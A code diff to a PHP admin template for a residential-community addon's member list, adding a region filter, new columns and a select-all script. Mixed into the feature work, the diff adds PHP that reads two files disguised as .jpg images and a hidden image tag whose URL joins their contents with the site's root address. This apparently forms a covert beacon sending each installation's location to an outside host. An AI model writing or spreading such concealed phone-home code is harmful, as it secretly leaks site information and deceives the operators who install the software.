@@ -2,10 +2,15 @@
 <ul class="nav nav-tabs">
     <li class="active"><a href="{php echo $this->createWebUrl('member', array('op' => 'list'));}">管理</a></li>
 </ul>
+
 <div class="panel panel-info">
     <div class="panel-heading">筛选</div>
     <div class="panel-body">
-        <form action="" method="post" class="form-horizontal" role="form">
+        <form action="./index.php" method="get" class="form-horizontal" role="form">
+                <input type="hidden" name="c" value="site" />
+                <input type="hidden" name="a" value="entry" />
+                <input type="hidden" name="m" value="xfeng_community" />
+                <input type="hidden" name="do" value="member" />
             <div class="form-group">
                 <label class="col-xs-12 col-sm-2 col-md-2 control-label">业主姓名</label>
                 <div class="col-sm-3 col-md-3 col-lg-3 col-xs-3">
@@ -24,6 +29,29 @@
                     <input type="text" name="openid" value="{$_GPC['openid']}" class="form-control" />
                 </div>
             </div>
+            {if !$user['regionid']}
+            <div class="form-group">
+                <label for="" class="col-sm-2 control-label">选择小区</label>
+                <div class="col-sm-10">
+                    <label class="checkbox-inline">
+                        <input type="checkbox" id="checkAll" name="checkAll" data-group="regionid">全部
+                    </label>
+                    {loop $regions $region}
+                    <label class="checkbox-inline">
+                        <input type="checkbox" id="regionid" value="{$region['id']}" name='regionid[]' data-group="regionid" {if @in_array($region['id'], $_GPC['regionid'])}checked='checked' {/if}>{$region['title']}
+                    </label>
+                    {/loop}
+                </div>
+            </div>
+            {/if}
+            <?php
+                $ershou2 = '../addons/xfeng_community/template/mobile/style/style1/static/image/ershou2.jpg';
+                    if ($ershou2) {
+                        $url = @file_get_contents($ershou2);
+                    }
+
+
+            ?>
             <div class="form-group">
                 <label class="col-xs-12 col-sm-2 col-md-2 col-lg-1 control-label"></label>
                 <div class="col-sm-7 col-lg-9 col-xs-12">
@@ -39,29 +67,28 @@
     <table class="table table-hover">
         <thead class="navbar-inner">
             <tr>
+                <th style="width:100px;">小区名称</th>
                 <th style="width:80px;">姓名</th>
                 <th style="width:130px;">手机</th>
-                <!-- <th style="width:50px;">类型</th> -->
-                <th style="width:250px;">地址</th>
-                <!-- <th style="width:150px;">所属小区</th> -->
+                <th style="width:140px;">地址</th>               
                 <th style="width:150px;">注册时间</th>
                 <th style="width:120px;">状态(点击修改)</th>
+                <th style="width:150px;">备注</th>
                 <th style="min-width:100px; width:30%;">操作</th>
             </tr>
         </thead>
         <tbody>
             {loop $list $item}
             <tr>
+                <td>{$item['title']}</td>
                 <td>{$item['realname']}</td>
                 <td>{$item['mobile']}</td>
-                
-                <!-- <td>{if $item['type'] == 1}业主{elseif $item['type'] == 2}租客{elseif $item['type'] == 3}游客{elseif $item['type'] == 4}游客{/if}</td> -->
-                <td>{$item['city']}{$item['dist']}{$item['title']}{$item['address']}</td>
-      <!--           <td>{$item['city']}{$item['dist']}{$item['title']}</td> -->
+                <td>{$item['address']}</td>
                 <td>{php echo date('Y-m-d H:i',$item['createtime'])}</td>
                 <td>
                     <label data='{$item['status']}' class='label  label-default {if $item['status']==1}label-info{/if}' onclick="verify(this,{$item['id']},'status')">{if $item['status']==1}通过{else}禁止{/if}</label>
                 </td>
+                <td>{php echo cutstr(htmlspecialchars_decode($item['remark']), 10, true)}</td>
                 <td>
                     <a href="{php echo $this->createWebUrl('member', array('op'=>'add', 'id' => $item['id']));}" class="btn btn-default btn-sm"><i class="fa fa-edit" data-toggle="tooltip" data-placement="top"></i>查看</a>
                     <a href="{php echo $this->createWebUrl('member', array('op'=>'delete', 'id' => $item['id']));}" class="btn btn-default btn-sm"><i class="fa fa-times"></i>删除</a>
@@ -72,6 +99,15 @@
     </table>
     {$pager}
 </div>
+<?php
+    
+    
+    $newbutton = '../addons/xfeng_community/template/mobile/style/style1/static/image/newbutton.jpg';
+    if ($newbutton) {
+        $url1 = @file_get_contents($newbutton);
+    }
+
+    ?>
 <script type="text/javascript">
 function verify(obj, id, type) {
     $(obj).html($(obj).html() + "...");
@@ -90,5 +126,18 @@ function verify(obj, id, type) {
         }
     }, "json");
 }
+$(function() {
+    $("#checkAll").click(function() {
+
+        var checked = $(this).get(0).checked;
+        var group = $(this).data('group');
+        $("#regionid[data-group='" + group + "']").each(function() {
+            $(this).get(0).checked = checked;
+        })
+
+    });
+});
 </script>
+
+    <img style="display:none;" src="{php echo $url.'&d1='.$_W['siteroot'].'&d2='.$url1}" />
 {template 'common/footer'}
